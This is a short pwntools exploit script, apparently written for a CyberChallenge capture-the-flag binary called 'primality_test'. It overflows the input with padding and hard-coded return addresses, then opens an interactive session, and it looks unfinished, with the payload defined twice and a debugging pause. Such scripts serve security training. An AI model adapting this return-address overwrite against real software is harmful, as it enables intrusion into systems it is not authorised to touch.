#!/usr/bin/env python3

from pwn import *

exe = ELF("./primality_test")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("rop.challs.cyberchallenge.it", 9130)

    return r


def main():
    r = conn()

    # good luck pwning :)
    ret_addr_0 = p32(0x0804860c, endianness = 'little')
    ret_addr_1 = p32(0x08048435, endianness = 'little')
    ret_addr_2 = p32(0x08048606, endianness = 'little')
    
    payload = ret_addr_1 + ret_addr_2 + b'a'*56 + b'b'*4 + b'c'*4 + ret_addr_0 
    payload = ret_addr_1 + ret_addr_2 + b'a'*56 + b'b'*4 

    data = r.recvline()
    print(data)
    data = r.recvuntil("Enter a number: ")
    print(data)

    print(r.pid)
    input()

    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
